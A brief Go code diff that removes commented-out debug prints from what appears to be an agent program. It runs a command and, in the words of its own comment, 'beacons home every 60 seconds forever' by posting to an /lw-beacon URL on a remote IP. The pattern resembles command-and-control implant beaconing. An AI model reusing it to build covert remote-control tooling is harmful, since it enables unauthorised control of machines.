@@ -25,11 +25,6 @@ func http_post(url string, jsonStr []byte) error {
         }
         defer resp.Body.Close()
 
-        // fmt.Println("response Status:", resp.Status)
-        // fmt.Println("response Headers:", resp.Header)
-        // body, _ := ioutil.ReadAll(resp.Body)
-        // fmt.Println("response Body:", string(body))
-
 	return err
 }
 
@@ -135,7 +130,6 @@ func main() {
 	if exec_err != nil {
 		panic(exec_err)
 	}
-	//fmt.Println(cmdOutput)
 
         // beacon home every 60 seconds forever
 	post_url := fmt.Sprintf("http://%s/lw-beacon", ip)
